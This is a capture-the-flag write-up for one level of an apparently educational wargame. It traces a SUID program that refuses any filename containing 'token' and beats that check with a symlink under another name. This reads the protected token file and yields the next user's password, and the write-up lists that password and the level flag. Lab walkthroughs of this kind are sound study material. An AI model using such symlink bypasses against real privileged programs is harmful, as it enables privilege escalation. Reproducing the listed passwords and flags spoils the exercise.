username: level08
password: fiumuikeil55xe9cu4dood66h
---

`level08` has SUID bit set, it can be run as its owner `flag08`. it takes a filename as argument and displays its content if it doesn't contain the word `token`, if it does it exits.

If we pass `token` as argument

```
$ ltrace ./level08 token 
...
strstr("token", "token")                                        = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)                    = 27
...
```

And if we pass another file

```
$ ltrace ./level08 /etc/os-release
...
strstr("/etc/os-release", "token")                              = NULL
open("/etc/os-release", 0, 014435162522)                        = 3
read(3, "NAME="Ubuntu"\nVERSION="12.04.5 L"..., 1024)           = 141
write(1, "NAME="Ubuntu"\nVERSION="12.04.5 L"..., 141NAME="Ubuntu"
...
```

To read	`token`, a symlink with a diferent name is created and passed as argument to `level08`.

Executing the following command outputs the password for user `flag08`: quif5eloekouj29ke0vouxean

```
ln -s /home/user/level08/token /tmp/a && ./level08 /tmp/a
```

To get the flag, we ran the following

```
su flag08 -c getflag
```

The flag is: 25749xKZ8L7DkSCwJkT9dyv6f
